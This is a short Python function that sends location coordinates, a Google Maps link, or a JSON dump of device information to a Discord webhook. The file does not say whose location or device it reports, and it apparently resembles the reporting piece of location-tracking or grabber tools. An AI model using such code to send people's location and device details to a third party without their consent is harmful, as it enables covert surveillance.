#!/usr/bin/env python3
import requests
import json

def discord_sender(webhook, msg_type, content):
    """Send messages to Discord"""
    try:
        if msg_type == 'location':
            embed = {
                "title": "📍 Location Update",
                "fields": [
                    {"name": "Latitude", "value": content.get('lat', 'N/A'), "inline": True},
                    {"name": "Longitude", "value": content.get('lon', 'N/A'), "inline": True},
                    {"name": "Accuracy", "value": content.get('acc', 'N/A'), "inline": True},
                    {"name": "Maps", "value": f"https://maps.google.com/?q={content.get('lat', '')},{content.get('lon', '')}"}
                ]
            }
        else:
            embed = {"title": "Device Info", "description": json.dumps(content, indent=2)}
        
        data = {"embeds": [embed]}
        requests.post(webhook, json=data, timeout=5)
        
    except Exception as e:
        print(f"Discord error: {e}")
